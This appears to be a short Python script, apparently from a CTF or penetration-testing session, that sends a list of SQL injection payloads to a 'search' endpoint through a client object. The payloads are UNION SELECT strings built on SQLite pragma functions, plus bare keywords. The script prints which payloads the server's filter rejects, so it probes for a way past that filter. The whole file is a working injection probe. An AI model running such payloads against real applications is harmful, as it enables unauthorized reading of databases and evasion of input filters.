from client import GhostClient

c = GhostClient()
c.bootstrap()

tests = [
    "' UNION SELECT 1, 2, 3 FROM pragma_database_list--",
    "' UNION SELECT 1, 2, 3 FROM pragma_database_list()--",
    "' UNION SELECT 1, 2, 3 FROM pragma_module_list()--",
    "' UNION SELECT 1, 2, 3 FROM pragma_function_list()--",
    "pragma_database_list",
    "database_list",
    "pragma_",
    "pragma_compile_options",
]

for t in tests:
    res = c.request("search", {"q": t})
    err = res.get("error") if not res.get("ok") else "OK"
    print(f"{t:50s} -> {err}")
